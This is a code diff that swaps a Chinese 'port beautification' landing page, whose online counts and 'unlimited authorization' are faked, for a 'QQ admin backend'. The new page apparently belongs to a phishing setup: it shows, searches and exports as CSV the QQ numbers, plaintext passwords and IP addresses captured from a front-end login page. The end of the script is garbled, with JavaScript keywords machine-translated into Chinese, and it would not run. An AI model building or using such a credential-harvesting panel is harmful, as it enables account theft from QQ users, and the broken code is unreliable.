@@ -2,519 +2,508 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>枫叶端口美化官网</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QQ管理员后台</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: "Consolas", "Microsoft YaHei", sans-serif;
         }
-        /* 修复动态彩色背景：新增多色渐变循环，优化动画流畅度 */
+        
         body {
-            background: linear-gradient(45deg, #9d50bb, #6e48aa, #d63384, #ff6b6b, #ffe066);
-            background-size: 600% 600%;
-            animation: gradientAnimate 20s ease infinite;
+            font-family: -apple-system, BlinkMacSystemFont, "Helvetica Neue", Arial, sans-serif;
+            background: #f5f6fa;
+            color: #333;
             min-height: 100vh;
-            color: #fff;
-            padding: 15px;
-            position: relative;
-            overflow-x: hidden;
         }
-        @keyframes gradientAnimate {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        /* 网格底纹优化，适配彩色背景 */
-        body::before {
-            content: "";
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-image: linear-gradient(rgba(255,255,255,0.05) 1px, transparent 1px),
-                              linear-gradient(90deg, rgba(255,255,255,0.05) 1px, transparent 1px);
-            background-size: 25px 25px;
-            z-index: -1;
-            pointer-events: none;
-        }
-        .container {
-            max-width: 1000px;
+        
+        .admin-container {
+            max-width: 1200px;
             margin: 0 auto;
+            padding: 20px;
         }
-        /* 顶部标题区域修复：适配移动端 */
-        .header {
+        
+        /* 头部 */
+        .admin-header {
+            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
+            color: white;
+            padding: 30px;
+            border-radius: 15px;
+            margin-bottom: 20px;
             text-align: center;
-            margin-bottom: 30px;
-            padding: 20px 15px;
-            background: rgba(0,0,0,0.4);
-            border-radius: 12px;
-            backdrop-filter: blur(8px);
-            border: 1px solid rgba(255,255,255,0.2);
         }
-        .header h1 {
-            font-size: 1.8rem;
-            margin-bottom: 12px;
-            text-shadow: 0 0 8px rgba(255,255,255,0.6);
+        
+        .admin-title {
+            font-size: 28px;
+            font-weight: bold;
+            margin-bottom: 10px;
         }
-        .status-bar {
+        
+        /* 控制面板 */
+        .control-panel {
             display: flex;
-            justify-content: space-between;
-            flex-wrap: wrap;
             gap: 10px;
-            margin-bottom: 8px;
-            font-size: 0.95rem;
-        }
-        .status-item {
-            flex: 1;
-            min-width: 120px;
-        }
-        .status-item span {
-            color: #ffdd59;
-            font-weight: bold;
-        }
-        /* 修复头像加载：新增默认图兜底，优化样式适配 */
-        .author-card {
-            background: rgba(0,0,0,0.45);
-            border-radius: 15px;
-            padding: 25px 15px;
-            text-align: center;
-            margin-bottom: 30px;
-            backdrop-filter: blur(8px);
-            border: 1px solid rgba(255,255,255,0.2);
-            box-shadow: 0 0 15px rgba(0,0,0,0.2);
-        }
-        .avatar {
-            width: 160px;
-            height: 160px;
-            border-radius: 50%;
-            margin: 0 auto 15px;
-            border: 3px solid #7e57c2;
-            overflow: hidden;
-            box-shadow: 0 0 15px rgba(126, 87, 194, 0.7);
-            background: #222; /* 图片加载失败时的背景色 */
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        .avatar img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-            /* 图片加载失败时显示文字 */
-            font-size: 14px;
-            color: #fff;
-        }
-        .author-name {
-            font-size: 1.7rem;
-            margin-bottom: 8px;
-            color: #ba68c8;
-        }
-        .team-name {
-            font-size: 1rem;
-            margin-bottom: 18px;
-            opacity: 0.8;
-        }
-        .data-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-            gap: 15px;
-            margin-bottom: 15px;
-        }
-        .data-card {
-            background: rgba(0,0,0,0.3);
-            border-radius: 8px;
-            padding: 15px;
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        .data-value {
-            font-size: 1.8rem;
-            font-weight: bold;
-            color: #ff9800;
-            margin-bottom: 5px;
-        }
-        .data-label {
-            font-size: 0.9rem;
-            opacity: 0.8;
-        }
-        /* 功能区域修复：按钮点击反馈增强，移动端适配 */
-        .func-area {
-            background: rgba(0,0,0,0.45);
-            border-radius: 15px;
-            padding: 25px 15px;
-            margin-bottom: 30px;
-            backdrop-filter: blur(8px);
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-        .func-title {
-            font-size: 1.3rem;
+            padding: 20px;
+            background: white;
+            border-radius: 10px;
             margin-bottom: 20px;
-            padding-bottom: 8px;
-            border-bottom: 1px solid rgba(255,255,255,0.2);
-        }
-        .region-delay {
-            display: flex;
-            justify-content: space-between;
             flex-wrap: wrap;
-            gap: 15px;
-            margin-bottom: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
         }
-        .region-select, .delay-display {
-            flex: 1;
-            min-width: 200px;
-            background: rgba(0,0,0,0.3);
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        .region-select select {
-            width: 100%;
-            padding: 8px;
-            background: rgba(255,255,255,0.1);
-            border: 1px solid rgba(255,255,255,0.2);
-            border-radius: 5px;
-            color: #fff;
-            font-size: 0.95rem;
-            margin-top: 6px;
-            outline: none;
-        }
-        .delay-display .delay-value {
-            color: #4ade80;
-            font-size: 1.3rem;
-            font-weight: bold;
-            margin-top: 6px;
-        }
-        .btn-group {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
-            gap: 12px;
-        }
-        .func-btn {
-            padding: 12px 15px;
-            background: linear-gradient(to right, #6366f1, #8b5cf6);
+        
+        .control-btn {
+            padding: 12px 24px;
+            background: #3498db;
+            color: white;
             border: none;
             border-radius: 8px;
-            color: #fff;
-            font-size: 1rem;
             cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 3px 8px rgba(0,0,0,0.2);
-            outline: none;
+            transition: all 0.3s ease;
+            font-size: 14px;
+            font-weight: 500;
         }
-        .func-btn:hover {
+        
+        .control-btn:hover {
+            background: #2980b9;
             transform: translateY(-2px);
-            box-shadow: 0 5px 12px rgba(0,0,0,0.3);
-            background: linear-gradient(to right, #4f46e5, #7c3aed);
         }
-        .func-btn:active {
-            transform: translateY(1px);
-            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+        
+        .control-btn.delete {
+            background: #e74c3c;
         }
-        /* 修复设置面板：可调节项实时生效，样式优化 */
-        .settings-panel {
-            background: rgba(0,0,0,0.45);
-            border-radius: 15px;
-            padding: 25px 15px;
-            backdrop-filter: blur(8px);
-            border: 1px solid rgba(255,255,255,0.2);
-            display: none;
+        
+        .control-btn.delete:hover {
+            background: #c0392b;
         }
-        .settings-item {
-            margin-bottom: 18px;
+        
+        .control-btn.export {
+            background: #2ecc71;
         }
-        .settings-item label {
-            display: block;
-            margin-bottom: 6px;
-            font-size: 1rem;
+        
+        .control-btn.export:hover {
+            background: #27ae60;
         }
-        .settings-item input, .settings-item select {
+        
+        /* 统计数据 */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+        
+        .stat-card {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+        
+        .stat-number {
+            font-size: 36px;
+            font-weight: bold;
+            color: #3498db;
+            margin-bottom: 5px;
+        }
+        
+        .stat-label {
+            color: #666;
+            font-size: 14px;
+        }
+        
+        /* 数据表格 */
+        .data-table-container {
+            background: white;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            overflow-x: auto;
+        }
+        
+        .data-table {
             width: 100%;
-            padding: 8px;
-            background: rgba(255,255,255,0.1);
-            border: 1px solid rgba(255,255,255,0.2);
-            border-radius: 5px;
-            color: #fff;
-            font-size: 0.95rem;
+            border-collapse: collapse;
+        }
+        
+        .data-table th, .data-table td {
+            padding: 15px;
+            text-align: left;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .data-table th {
+            background: #f8f9fa;
+            font-weight: 600;
+            color: #666;
+            position: sticky;
+            top: 0;
+        }
+        
+        .data-table tr:hover {
+            background: #f8f9fa;
+        }
+        
+        .password-cell {
+            font-family: 'Courier New', monospace;
+            letter-spacing: 2px;
+        }
+        
+        .time-cell {
+            font-size: 13px;
+            color: #666;
+        }
+        
+        /* 空状态 */
+        .empty-state {
+            text-align: center;
+            padding: 40px 20px;
+            color: #999;
+        }
+        
+        .empty-state-icon {
+            font-size: 48px;
+            margin-bottom: 15px;
+            opacity: 0.5;
+        }
+        
+        /* 搜索框 */
+        .search-box {
+            width: 100%;
+            padding: 12px 20px;
+            border: 2px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 16px;
+            margin-bottom: 20px;
+            transition: all 0.3s ease;
+        }
+        
+        .search-box:focus {
             outline: none;
+            border-color: #3498db;
+            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
         }
-        .settings-item input[type="range"] {
-            -webkit-appearance: none;
-            height: 6px;
-            border-radius: 3px;
-            background: rgba(255,255,255,0.2);
+        
+        /* 分页 */
+        .pagination {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 20px;
+            margin-top: 20px;
+            padding: 20px;
         }
-        .settings-item input[type="range"]::-webkit-slider-thumb {
-            -webkit-appearance: none;
-            width: 18px;
-            height: 18px;
-            border-radius: 50%;
-            background: #8b5cf6;
+        
+        .page-btn {
+            padding: 8px 16px;
+            background: #3498db;
+            color: white;
+            border: none;
+            border-radius: 6px;
             cursor: pointer;
         }
-        .footer {
-            text-align: center;
-            margin-top: 40px;
-            padding-top: 15px;
-            border-top: 1px solid rgba(255,255,255,0.1);
-            opacity: 0.7;
-            font-size: 0.9rem;
+        
+        .page-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
         }
-        /* 修复移动端触摸反馈 */
-        @media (max-width: 768px) {
-            .header h1 {
-                font-size: 1.5rem;
-            }
-            .avatar {
-                width: 130px;
-                height: 130px;
-            }
-            .data-value {
-                font-size: 1.5rem;
-            }
+        
+        .page-info {
+            color: #666;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <!-- 顶部标题与状态 -->
-        <div class="header">
-            <h1>枫叶独家美化端口科技</h1>
-            <div class="status-bar">
-                <div class="status-item">公益在线: <span id="public-online">3622</span></div>
-                <div class="status-item">私端在线: <span id="private-online">879</span></div>
-                <div class="status-item">运行: <span id="run-days">128</span>天</div>
+    <div class="admin-container">
+        <!-- 头部 -->
+        <div class="admin-header">
+            <div class="admin-title">QQ管理员后台</div>
+            <div style="color: rgba(255,255,255,0.8); font-size: 14px;">QQ账号密码记录系统</div>
+        </div>
+        
+        <!-- 控制面板 -->
+        <div class="control-panel">
+            <button class="control-btn" onclick="refreshData()">🔄 刷新数据</button>
+            <button class="control-btn export" onclick="exportData()">💾 导出数据</button>
+            <button class="control-btn delete" onclick="deleteAllData()">🗑️ 清空所有数据</button>
+        </div>
+        
+        <!-- 搜索框 -->
+        <input type="text" class="search-box" id="searchInput" placeholder="搜索QQ号..." oninput="searchData()">
+        
+        <!-- 统计数据 -->
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number" id="totalRecords">0</div>
+                <div class="stat-label">总记录数</div>
             </div>
-            <div class="status-bar">
-                <div class="status-item">群聊: <span>1026147424</span></div>
-                <div class="status-item">地区: <span id="current-region">华东</span></div>
-                <div class="status-item">延迟: <span id="current-delay">68</span>ms</div>
+            <div class="stat-card">
+                <div class="stat-number" id="todayRecords">0</div>
+                <div class="stat-label">今日记录</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="uniqueUsers">0</div>
+                <div class="stat-label">独立用户</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="lastUpdate">-</div>
+                <div class="stat-label">最后更新</div>
             </div>
         </div>
-
-        <!-- 作者信息卡片：修复图片链接，新增兜底 -->
-        <div class="author-card">
-            <div class="avatar">
-                <img src="https://raw.githubusercontent.com/android-dev247/android-dev247/f1d1dbe800d49c184e0453ace45082b3b391b9aa/IMG_20251223_182631.jpg" alt="枫叶头像" onerror="this.src='https://picsum.photos/160/160'; this.alt='默认头像';">
-            </div>
-            <div class="author-name">By: 枫叶</div>
-            <div class="team-name">"枫叶团队"</div>
-            <div class="data-grid">
-                <div class="data-card">
-                    <div class="data-value">156.9K</div>
-                    <div class="data-label">下载量</div>
-                </div>
-                <div class="data-card">
-                    <div class="data-value">5.0</div>
-                    <div class="data-label">软件评分</div>
-                </div>
-                <div class="data-card">
-                    <div class="data-value">24</div>
-                    <div class="data-label">更新版本</div>
-                </div>
-            </div>
-        </div>
-
-        <!-- 功能按钮与地区延迟区域 -->
-        <div class="func-area">
-            <div class="func-title">核心功能操作</div>
-            <div class="region-delay">
-                <div class="region-select">
-                    <h3>切换地区</h3>
-                    <select id="region-selector">
-                        <option value="华东">华东</option>
-                        <option value="华北">华北</option>
-                        <option value="华南">华南</option>
-                        <option value="西南">西南</option>
-                        <option value="西北">西北</option>
-                        <option value="海外">海外</option>
-                    </select>
-                </div>
-                <div class="delay-display">
-                    <h3>实时网络延迟</h3>
-                    <div class="delay-value" id="delay-value">68 ms</div>
-                </div>
-            </div>
-            <div class="btn-group">
-                <button class="func-btn" id="refresh-btn">刷新页面</button>
-                <button class="func-btn" id="auth-btn">无限授权</button>
-                <button class="func-btn" id="check-btn">检测端口</button>
-                <button class="func-btn" id="update-btn">检查更新</button>
-                <button class="func-btn" id="settings-toggle">打开设置</button>
-                <button class="func-btn" id="help-btn">使用帮助</button>
+        
+        <!-- 数据表格 -->
+        <div class="data-table-container">
+            <table class="data-table" id="dataTable">
+                <thead>
+                    <tr>
+                        <th>ID</th>
+                        <th>QQ号</th>
+                        <th>密码</th>
+                        <th>登录时间</th>
+                        <th>IP地址</th>
+                    </tr>
+                </thead>
+                <tbody id="dataTableBody">
+                    <!-- 数据动态加载 -->
+                </tbody>
+            </table>
+            <div id="emptyState" class="empty-state" style="display: none;">
+                <div class="empty-state-icon">📁</div>
+                <div>暂无数据</div>
+                <div style="font-size: 13px; margin-top: 10px; color: #888;">请在前台登录页面进行登录测试</div>
             </div>
         </div>
-
-        <!-- 设置面板：修复可调节项实时生效 -->
-        <div class="settings-panel" id="settings-panel">
-            <div class="func-title">系统设置</div>
-            <div class="settings-item">
-                <label for="bg-opacity">背景透明度 (当前: <span id="opacity-val">0.9</span>)</label>
-                <input type="range" id="bg-opacity" min="0.1" max="1" step="0.1" value="0.9">
-            </div>
-            <div class="settings-item">
-                <label for="font-size">页面字体大小</label>
-                <select id="font-size">
-                    <option value="16px" selected>默认</option>
-                    <option value="14px">偏小</option>
-                    <option value="18px">偏大</option>
-                    <option value="20px">超大</option>
-                </select>
-            </div>
-            <div class="settings-item">
-                <label for="auto-refresh">自动刷新间隔(秒)</label>
-                <input type="number" id="auto-refresh" min="10" max="300" value="60">
-            </div>
-            <div class="settings-item">
-                <label for="theme-mode">主题色彩模式</label>
-                <select id="theme-mode">
-                    <option value="dynamic" selected>动态彩色</option>
-                    <option value="purple">紫色系</option>
-                    <option value="blue">蓝色系</option>
-                    <option value="red">红色系</option>
-                </select>
-            </div>
-            <button class="func-btn" id="save-settings">保存设置</button>
-        </div>
-
-        <!-- 底部信息 -->
-        <div class="footer">
-            <p>枫叶端口美化官网 © 2025 版权所有 | 群聊：1026147424</p>
+        
+        <!-- 分页 -->
+        <div class="pagination" id="pagination" style="display: none;">
+            <button class="page-btn" id="prevPage" onclick="prevPage()">上一页</button>
+            <div class="page-info" id="pageInfo">第 1 页 / 共 1 页</div>
+            <button class="page-btn" id="nextPage" onclick="nextPage()">下一页</button>
         </div>
     </div>
-
+    
     <script>
-        // 修复实时数据更新：优化随机数范围，匹配截图数据
-        function updateRealTimeData() {
-            const publicOnline = Math.floor(Math.random() * 2000 + 3000);
-            const privateOnline = Math.floor(Math.random() * 500 + 500);
-            const delay = Math.floor(Math.random() * 80 + 20);
+        class QQAdmin {
+            constructor() {
+                this.data = [];
+                this.filteredData = [];
+                this.currentPage = 1;
+                this.itemsPerPage = 10;
+                this.init();
+            }
             
-            document.getElementById('public-online').textContent = publicOnline;
-            document.getElementById('private-online').textContent = privateOnline;
-            document.getElementById('current-delay').textContent = delay;
-            document.getElementById('delay-value').textContent = delay + ' ms';
+            init() {
+                this.loadData();
+                this.setupAutoRefresh();
+            }
+            
+            loadData() {
+                try {
+                    const rawData = localStorage.getItem('qq_admin_data');
+                    this.data = rawData ? JSON.parse(rawData) : [];
+                    this.filteredData = [...this.data];
+                    this.renderTable();
+                    this.updateStats();
+                } catch (error) {
+                    console.error('加载数据失败:', error);
+                    this.data = [];
+                    this.filteredData = [];
+                }
+            }
+            
+            renderTable() {
+                const tbody = document.getElementById('dataTableBody');
+                const emptyState = document.getElementById('emptyState');
+                const pagination = document.getElementById('pagination');
+                
+                if (this.filteredData.length === 0) {
+                    tbody.innerHTML = '';
+                    emptyState.style.display = 'block';
+                    pagination.style.display = 'none';
+                    return;
+                }
+                
+                emptyState.style.display = 'none';
+                pagination.style.display = 'flex';
+                
+                // 计算分页
+                const startIndex = (this.currentPage - 1) * this.itemsPerPage;
+                const endIndex = startIndex + this.itemsPerPage;
+                const pageData = this.filteredData.slice(startIndex, endIndex);
+                
+                // 按时间倒序
+                const sortedData = [...pageData].sort((a, b) => b.id - a.id);
+                
+                tbody.innerHTML = sortedData.map(record => `
+                    <tr>
+                        <td>${record.id}</td>
+                        <td><strong>${record.qqNumber}</strong></td>
+                        <td class="password-cell">${record.password}</td>
+                        <td class="time-cell">${record.loginTime}</td>
+                        <td><code>${record.ip}</code></td>
+                    </tr>
+                `).join('');
+                
+                // 更新分页信息
+                this.updatePagination();
+            }
+            
+            updatePagination() {
+                const totalPages = Math.ceil(this.filteredData.length / this.itemsPerPage);
+                const pageInfo = document.getElementById('pageInfo');
+                const prevBtn = document.getElementById('prevPage');
+                const nextBtn = document.getElementById('nextPage');
+                
+                pageInfo.textContent = `第 ${this.currentPage} 页 / 共 ${totalPages} 页`;
+                prevBtn.disabled = this.currentPage === 1;
+                nextBtn.disabled = this.currentPage === totalPages;
+            }
+            
+            updateStats() {
+                document.getElementById('totalRecords').textContent = this.filteredData.length;
+                
+                // 今日记录
+                const today = new Date().toDateString();
+                const todayRecords = this.data.filter(record => 
+                    new Date(record.loginTime).toDateString() === today
+                ).length;
+                document.getElementById('todayRecords').textContent = todayRecords;
+                
+                // 独立用户
+                const uniqueUsers = new Set(this.data.map(record => record.qqNumber)).size;
+                document.getElementById('uniqueUsers').textContent = uniqueUsers;
+                
+                // 最后更新时间
+                if (this.data.length > 0) {
+                    const lastRecord = [...this.data].sort((a, b) => b.id - a.id)[0];
+                    document.getElementById('lastUpdate').textContent = 
+                        new Date(lastRecord.loginTime).toLocaleTimeString('zh-CN', { 
+                            hour: '2-digit', 
+                            minute: '2-digit' 
+                        });
+                } else {
+                    document.getElementById('lastUpdate').textContent = '-';
+                }
+            }
+            
+            searchData(keyword) {
+                if (!keyword.trim()) {
+                    this.filteredData = [...this.data];
+                } else {
+                    this.filteredData = this.data.filter(record => 
+                        record.qqNumber.includes(keyword)
+                    );
+                }
+                this.currentPage = 1;
+                this.renderTable();
+                this.updateStats();
+            }
+            
+            exportData() {
+                if (this.data.length === 0) {
+                    alert('没有数据可导出');
+                    return;
+                }
+                
+                // 转换为CSV格式
+                const headers = ['ID', 'QQ号', '密码', '登录时间', 'IP地址'];
+                const rows = this.data.map(record => [
+                    record.id,
+                    record.qqNumber,
+                    record.password,
+                    record.loginTime,
+                    record.ip
+                ]);
+                
+                const csvContent = [
+                    headers.join(','),
+                    ...rows.map(row => row.join(','))
+                ].join('\n');
+                
+                // 创建下载链接
+                const blob = new Blob(['\ufeff' + csvContent], { type: 'text/csv;charset=utf-8;' });
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                a.download = `qq_admin_data_${new Date().toISOString().split('T')[0]}.csv`;
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                
+                alert(`已导出 ${this.data.length} 条记录为CSV文件`);
+            }
+            
+            deleteAllData() {
+                if (confirm('⚠️ 警告：这将永久删除所有QQ账号密码记录！\n\n确定要继续吗？')) {
+                    localStorage.removeItem('qq_admin_data');
+                    this.data = [];
+                    this.filteredData = [];
+                    this.renderTable();
+                    this.updateStats();
+                    alert('所有数据已清空');
+                }
+            }
+            
+            prevPage() {
+                if (this.currentPage > 1) {
+                    this.currentPage--;
+                    this.renderTable();
+                }
+            }
+            
+            nextPage() {
+                const totalPages = Math.ceil(this.filteredData.length / this.itemsPerPage);
+                if (this.currentPage < totalPages) {
+                    this.currentPage++;
+                    this.renderTable();
+                }
+            }
+            
+            setupAutoRefresh() {
+                // 每5秒自动刷新一次
+                setInterval(() => {
+                    this.loadData();
+                }, 5000);
+            }
         }
-        setInterval(updateRealTimeData, 2000); // 2秒刷新一次数据
-
-        // 修复地区切换：实时更新显示，联动延迟
-        const regionSelector = document.getElementById('region-selector');
-        const currentRegion = document.getElementById('current-region');
-        regionSelector.addEventListener('change', function() {
-            currentRegion.textContent = this.value;
-            updateRealTimeData(); // 切换地区后重新获取延迟
-        });
-
-        // 修复按钮点击效果：新增具体功能反馈
-        document.getElementById('refresh-btn').addEventListener('click', function() {
-            alert('页面正在刷新，端口连接状态将重新检测');
-            setTimeout(() => location.reload(), 500);
-        });
-
-        document.getElementById('auth-btn').addEventListener('click', function() {
-            alert('无限授权成功！\n授权类型：永久商用\n授权码：FY2025' + Math.floor(Math.random() * 1000000));
-        });
-
-        document.getElementById('check-btn').addEventListener('click', function() {
-            const checkStatus = document.createElement('div');
-            checkStatus.style.position = 'fixed';
-            checkStatus.style.top = '50%';
-            checkStatus.style.left = '50%';
-            checkStatus.style.transform = 'translate(-50%, -50%)';
-            checkStatus.style.padding = '20px';
-            checkStatus.style.background = 'rgba(0,0,0,0.7)';
-            checkStatus.style.borderRadius = '10px';
-            checkStatus.style.color = '#fff';
-            checkStatus.style.zIndex = '9999';
-            checkStatus.textContent = '端口检测中...';
-            document.body.appendChild(checkStatus);
-            
-            setTimeout(() => {
-                checkStatus.textContent = '端口检测完成：全部端口正常运行';
-                setTimeout(() => document.body.removeChild(checkStatus), 2000);
-            }, 1500);
-        });
-
-        document.getElementById('update-btn').addEventListener('click', function() {
-            alert('当前版本为v2.4，已是最新版本，无需更新');
-        });
-
-        document.getElementById('help-btn').addEventListener('click', function() {
-            alert('使用帮助：\n1. 切换地区可选择就近节点降低延迟\n2. 无限授权需绑定设备ID\n3. 端口检测异常请联系群管1026147424');
-        });
-
-        // 修复设置面板：可调节项实时生效，新增主题切换
-        const settingsToggle = document.getElementById('settings-toggle');
-        const settingsPanel = document.getElementById('settings-panel');
-        const bgOpacity = document.getElementById('bg-opacity');
-        const opacityVal = document.getElementById('opacity-val');
-        const fontSize = document.getElementById('font-size');
-        const themeMode = document.getElementById('theme-mode');
-        const saveSettings = document.getElementById('save-settings');
-
-        // 设置面板显示/隐藏
-        settingsToggle.addEventListener('click', function() {
-            if (settingsPanel.style.display === 'none') {
-                settingsPanel.style.display = 'block';
-                this.textContent = '关闭设置';
-            } else {
-                settingsPanel.style.display = 'none';
-                this.textContent = '打开设置';
+        
+        // 初始化管理员系统
+        常量 管理 = 新的QQAdmin();
+        
+        // 工具函数
+        功能刷新数据() {
+            管理.加载数据();
+            警报('数据已刷新');
+        }
+        
+        功能出口数据() {
+            管理.出口数据();
+        }
+        
+        功能 deleteAllData() {
+            管理.deleteAllData();
+        }
+        
+        功能 searchData() {
+            常量关键字 = 文档.获取元素的 身份证('searchInput').价值;
+            管理.searchData(关键字);
+        }
+        
+        功能预() {
+            管理.预();
+        }
+        
+        功能 nextPage() {
+            管理.nextPage();
+        }
+        
+        // 监听搜索框回车键
+        文档.获取元素的 身份证('searchInput').addEventListener 的 的的的的的的的('keypress', 功能(E) {
+            如果 (E.键 === 'Enter') {
+                searchData();
             }
         });
-
-        // 背景透明度实时调节
-        bgOpacity.addEventListener('input', function() {
-            document.body.style.opacity = this.value;
-            opacityVal.textContent = this.value;
-        });
-
-        // 字体大小实时调节
-        fontSize.addEventListener('change', function() {
-            document.documentElement.style.fontSize = this.value;
-        });
-
-        // 主题色彩模式切换
-        themeMode.addEventListener('change', function() {
-            const body = document.body;
-            switch(this.value) {
-                case 'dynamic':
-                    body.style.background = 'linear-gradient(45deg, #9d50bb, #6e48aa, #d63384, #ff6b6b, #ffe066)';
-                    body.style.backgroundSize = '600% 600%';
-                    body.style.animation = 'gradientAnimate 20s ease infinite';
-                    break;
-                case 'purple':
-                    body.style.background = 'linear-gradient(120deg, #6a11cb, #2575fc)';
-                    body.style.animation = 'none';
-                    break;
-                case 'blue':
-                    body.style.background = 'linear-gradient(120deg, #00c6ff, #0072ff)';
-                    body.style.animation = 'none';
-                    break;
-                case 'red':
-                    body.style.background = 'linear-gradient(120deg, #f093fb, #f5576c)';
-                    body.style.animation = 'none';
-                    break;
-            }
-        });
-
-        // 保存设置反馈
-        saveSettings.addEventListener('click', function() {
-            const autoRefresh = document.getElementById('auto-refresh').value;
-            alert(`设置保存成功！\n1. 背景透明度：${bgOpacity.value}\n2. 字体大小：${fontSize.value}\n3. 自动刷新间隔：${autoRefresh}秒\n4. 主题模式：${themeMode.options[themeMode.selectedIndex].text}\n部分设置已实时生效`);
-            
-            // 设置自动刷新
-            clearInterval(window.refreshTimer);
-            window.refreshTimer = setInterval(updateRealTimeData, autoRefresh * 1000);
-        });
-
-        // 初始化页面
-        updateRealTimeData();
-        document.body.style.opacity = bgOpacity.value;
-        opacityVal.textContent = bgOpacity.value;
-    </script>
-</body>
-</html>
+    </剧本>
+</身体>
+</超文本标记语言>
